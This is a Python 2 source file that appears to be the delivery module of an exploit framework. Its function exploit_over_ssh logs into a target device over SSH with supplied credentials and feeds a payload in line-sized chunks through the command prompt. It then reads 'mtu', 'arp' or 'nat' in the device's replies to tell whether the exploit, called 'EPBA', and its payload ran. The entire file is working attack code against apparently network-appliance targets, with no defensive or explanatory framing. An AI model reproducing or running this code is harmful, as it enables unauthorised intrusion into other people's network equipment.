import binascii

from pexpect import *
from params import *
import string
import time


def exploit_over_ssh(params, payload):
    if params.verbose:
        print "initiating ssh"

    command = "%s -l %s -p %s %s %s" % (params.ssh_cmd, params.username, params.target_port, params.ssh_opts, params.target_ip)
    print "spawning " + command

    responses = [TIMEOUT,
                 EOF,
                 "Are you sure you want to continue connecting",
                 "assword: ",
                 "Permission denied",
                 "for a list of available commands.",
                 ">"]

    child = spawn(command)

    while True:
        response = child.expect(responses, timeout=params.timeout)
        print str(child.before) + str(child.after)

        if response == 0:
            print "child timed out, exploit may be failing early"
            break
        elif response == 1:
            print "child EOF, exploit may be failing early"
            break
        elif response == 2:
            print "ack'ing lack of ssh keys"
            child.sendline("yes")
        elif response == 3:
            print "sending password"
            child.sendline(params.password)
        elif response == 4:
            print "failed to login, bad creds, abort"
            return 1
        elif response == 5:
            print "saw help message, good so far"
        elif response == 6:
            break

    if response == 6:
        print "received prompt, we're in"
    else:
        print "ssh fails"
        return 1
    
    if params.verbose:
        print "sending payload"

    ##
    ##
    ##
    chopped = string.rstrip(payload, "\x0a")
    chunks = string.split(chopped, "\x0a")
    ##
    if len(chunks) == 16:
        chunks = [string.join((chunks[0], chunks[1]), "\x0a")] + chunks[2:]
    tot = len(chunks)
    n = 1
    for chunk in chunks:
        if params.verbose:
            print "sending command " + str(n) + "/" + str(tot) + ", len " + str(len(chunk) + 1)
        n = n + 1
        child.send(chunk + "\x0a")

        responses = [TIMEOUT, EOF, "Invalid input"]
        response = child.expect(responses, timeout=params.timeout)
        if response == 0:
            print "child timed out, exploit may be failing"
        elif response == 1:
            print "child EOF, exploit may be failing"
        elif response == 2:
            print "received expected error msg, still alive"

        time.sleep(params.delay)

    if params.verbose:
        print "payload sent"
        print "waiting for response from target"

    time.sleep(params.delay)

    PREV = "\x10"

    child.send(PREV + PREV + PREV)
    responses = [TIMEOUT, EOF, "mtu", "arp", "nat"]
    response = child.expect(responses, timeout=params.timeout)
    ##
    status = 0
    if response == 0:
        print "child timed out"
        status = 1
    elif response == 1:
        print "child EOF, giving up"
        status = 1
    elif response == 2:
        print "received mtu - EPBA: ok, payload: ok"
        status = 0
    elif response == 3:
        print "received arp - EPBA: ok, payload: fail"
        status = 1
    elif response == 4:
        print "received nat - EPBA: ok, payload: mangled, did not run"
        status = 1

    if response < 2:
        print "no status returned from target, could be an exploit failure, or this is a version where we don't expect a status return"
        status = 0

    child.close()

    return status
